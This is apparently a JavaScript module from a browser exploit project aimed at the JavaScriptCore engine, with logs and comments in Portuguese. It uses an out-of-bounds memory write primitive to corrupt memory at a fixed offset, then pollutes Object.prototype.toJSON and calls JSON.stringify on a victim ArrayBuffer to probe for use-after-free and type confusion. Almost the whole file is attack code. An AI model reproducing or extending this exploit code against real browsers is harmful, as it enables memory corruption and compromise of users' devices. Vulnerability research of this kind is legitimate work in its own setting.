// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CORRUPT_VICTIM_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write_for_corruption: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "CorruptVictimAndStringify_0x70_FFFF"
};

export let callCount_detailed_toJSON = 0;
const MAX_toJSON_DEPTH_FOR_PROBING = 10; // Profundidade para sondar 'this'

// Esta é a toJSON que sonda 'this' e tem controle de profundidade
export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
    callCount_detailed_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_Probe(Call ${callCount_detailed_toJSON})`;

    if (callCount_detailed_toJSON === 1 || (callCount_detailed_toJSON % 5 === 0 && callCount_detailed_toJSON <= MAX_toJSON_DEPTH_FOR_PROBING) ) {
        document.title = `detailed_toJSON_Probe Call ${callCount_detailed_toJSON}/${MAX_toJSON_DEPTH_FOR_PROBING}`;
    }
    
    if (callCount_detailed_toJSON <= MAX_toJSON_DEPTH_FOR_PROBING) {
        logS3(`[PP - Probe Victim] ${FNAME_toJSON_local} Chamado!`, "vuln");
        logS3(`  [CALL ${callCount_detailed_toJSON}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
        logS3(`  [CALL ${callCount_detailed_toJSON}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info");
    }

    if (callCount_detailed_toJSON > MAX_toJSON_DEPTH_FOR_PROBING) {
        if (callCount_detailed_toJSON === MAX_toJSON_DEPTH_FOR_PROBING + 1) {
            logS3(`  [CALL ${callCount_detailed_toJSON}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_PROBING}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Probe Profundidade Máx (${MAX_toJSON_DEPTH_FOR_PROBING})`;
        }
        return undefined;
    }

    let probe_details = { 
        raw_byteLength: "N/A", 
        type_of_raw_byteLength: "N/A",
        first_dword_attempt: "N/A", 
        first_dword_value: "N/A",
        slice_exists: "N/A", 
        slice_call_attempt: "N/A",
        slice_call_result: "N/A",
    };
    let error_during_probing = null;

    try {
        probe_details.raw_byteLength = currentOperationThis.byteLength;
        probe_details.type_of_raw_byteLength = typeof probe_details.raw_byteLength;
        logS3(`  [CALL ${callCount_detailed_toJSON}] PROBE: this.byteLength: ${probe_details.raw_byteLength} (tipo: ${probe_details.type_of_raw_byteLength})`, "leak");

        probe_details.first_dword_attempt = "Tentado";
        if (currentOperationThis instanceof ArrayBuffer && typeof probe_details.raw_byteLength === 'number' && probe_details.raw_byteLength >= 4) {
            try {
                let dv = new DataView(currentOperationThis, 0, 4);
                probe_details.first_dword_value = dv.getUint32(0, true);
                probe_details.first_dword_attempt += ", DataView OK";
                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: 1st DWORD de 'this' (ArrayBuffer): ${toHex(probe_details.first_dword_value)}`, "leak");
            } catch (e_dv) {
                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: ERRO ao tentar DataView em 'this' (ArrayBuffer): ${e_dv.message}`, "error");
                probe_details.first_dword_attempt += `, ERRO DataView: ${e_dv.message}`;
                error_during_probing = error_during_probing || `DV Error on AB: ${e_dv.message}`;
            }
        } else {
            probe_details.first_dword_attempt += ", 'this' não é AB ou byteLength inválido para DV.";
        }

        probe_details.slice_exists = (typeof currentOperationThis.slice === 'function');
        probe_details.slice_call_attempt = "Tentado";
        if (probe_details.slice_exists && currentOperationThis instanceof ArrayBuffer) { // Apenas tentar chamar slice se 'this' for um ArrayBuffer
            logS3(`  [CALL ${callCount_detailed_toJSON}] PROBE: 'this.slice' existe. Tentando chamar this.slice(0,1)...`, "info");
            try {
                let slice_result = currentOperationThis.slice(0,1); 
                probe_details.slice_call_result = `OK, resultado.byteLength = ${slice_result?.byteLength}, tipo resultado: ${typeof slice_result}`;
                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "good");
            } catch (e_slice) {
                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: ERRO ao chamar this.slice(0,1): ${e_slice.message}`, "error");
                probe_details.slice_call_result = `ERRO: ${e_slice.message}`;
                error_during_probing = error_during_probing || `Slice Error: ${e_slice.message}`;
            }
        } else if (probe_details.slice_exists) {
            probe_details.slice_call_result = "Existe, mas 'this' não é ArrayBuffer, não chamado.";
        } else {
            probe_details.slice_call_attempt += ", 'slice' não é função.";
        }
        
        if (error_during_probing) {
             logS3(`  [CALL ${callCount_detailed_toJSON}] Erro durante probing: ${error_during_probing}`, "error");
        }

    } catch (e_general_probe) { 
        error_during_probing = `General Probe Error: ${e_general_probe.message}`;
        logS3(`  [PP - Probe Victim] ${FNAME_toJSON_local} ERRO GERAL no probing: ${e_general_probe.message} (Call: ${callCount_detailed_toJSON})`, "critical");
        document.title = `ERRO GERAL toJSON Probe Call ${callCount_detailed_toJSON}`;
    }
    
    if (error_during_probing) {
        throw new Error(`Error during toJSON probe Call ${callCount_detailed_toJSON}: ${error_during_probing}`);
    }
    // Retornar um objeto simples para que JSON.stringify possa continuar até o limite de profundidade
    // ou até que um erro real seja lançado e pego pelo catch externo.
    return { toJSON_probe_call: callCount_detailed_toJSON, this_type: Object.prototype.toString.call(currentOperationThis), details: probe_details };
}


export async function executeCorruptVictimAndStringify() {
    const FNAME_TEST_RUNNER = CORRUPT_VICTIM_PARAMS.description;
    logS3(`--- Iniciando ${FNAME_TEST_RUNNER} ---`, "test", FNAME_TEST_RUNNER);
    logS3(`   Sondando victim_ab com toJSON detalhada (Max Depth: ${MAX_toJSON_DEPTH_FOR_PROBING})`, "info", FNAME_TEST_RUNNER);
    document.title = `Iniciando ${FNAME_TEST_RUNNER}`;

    callCount_detailed_toJSON = 0; // Resetar contador global

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST_RUNNER);
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = `OOB OK - ${FNAME_TEST_RUNNER}`;

    // victim_ab é o objeto que será passado para JSON.stringify
    let victim_ab = new ArrayBuffer(CORRUPT_VICTIM_PARAMS.victim_ab_size);
    logS3(`ArrayBuffer victim_ab (${CORRUPT_VICTIM_PARAMS.victim_ab_size}b) criado. Este será o 'this' na toJSON.`, "info", FNAME_TEST_RUNNER);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CORRUPT_VICTIM_PARAMS.ppKey} com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST_RUNNER);
        document.title = `Aplicando PP Probe Victim - ${FNAME_TEST_RUNNER}`;
        Object.defineProperty(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey, {
            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com detailed_toJSON (probe victim).`, "good", FNAME_TEST_RUNNER);
        stepReached = "pp_aplicada";
        document.title = `PP Probe Victim OK - ${FNAME_TEST_RUNNER}`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO OOB: ${toHex(CORRUPT_VICTIM_PARAMS.value_to_write_for_corruption)} @ ${toHex(CORRUPT_VICTIM_PARAMS.corruption_offset)} (no oob_array_buffer_real)`, "warn", FNAME_TEST_RUNNER);
        document.title = `Antes OOB Write - ${FNAME_TEST_RUNNER}`;
        oob_write_absolute(CORRUPT_VICTIM_PARAMS.corruption_offset, CORRUPT_VICTIM_PARAMS.value_to_write_for_corruption, CORRUPT_VICTIM_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita (no oob_array_buffer_real).", "info", FNAME_TEST_RUNNER);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write - ${FNAME_TEST_RUNNER}`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_victim_ab";
        document.title = `Antes Stringify victim_ab - ${FNAME_TEST_RUNNER}`;
        logS3(`Chamando JSON.stringify(victim_ab)... (this na toJSON será victim_ab)`, "info", FNAME_TEST_RUNNER);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); // O 'this' na toJSON será o victim_ab
            stepReached = `apos_stringify_victim_ab`;
            potentiallyCrashed = false;
            document.title = `Strfy victim_ab OK - ${FNAME_TEST_RUNNER}`;
            logS3(`Resultado JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_detailed_toJSON})`, "info", FNAME_TEST_RUNNER);
        } catch (e) {
            stepReached = `erro_stringify_victim_ab`;
            potentiallyCrashed = false;
            errorCaptured = e;
            document.title = `ERRO Strfy victim_ab (${e.name}) - ${FNAME_TEST_RUNNER}`;
            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_detailed_toJSON})`, "critical", FNAME_TEST_RUNNER);
            if(e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR for victim_ab (CorruptVictim):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME_TEST_RUNNER);
        document.title = "ERRO Principal CorruptVictim - " + FNAME_TEST_RUNNER;
        if(mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main CorruptVictim test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CORRUPT_VICTIM_PARAMS.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME_TEST_RUNNER);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME_TEST_RUNNER}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}`, "error", FNAME_TEST_RUNNER);
        }
    }
    logS3(`--- Teste de Corrupção de Vítima e Stringify Concluído: ${FNAME_TEST_RUNNER} (Chamadas toJSON: ${callCount_detailed_toJSON}) ---`, "test", FNAME_TEST_RUNNER);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste CorruptVictim OK - ${FNAME_TEST_RUNNER}`;
    } else if (errorCaptured) {
        // Título já reflete erro
    }
    return { potentiallyFroze: potentiallyCrashed, errorOccurred: errorCaptured, calls: callCount_detailed_toJSON, stringifyResult };
}
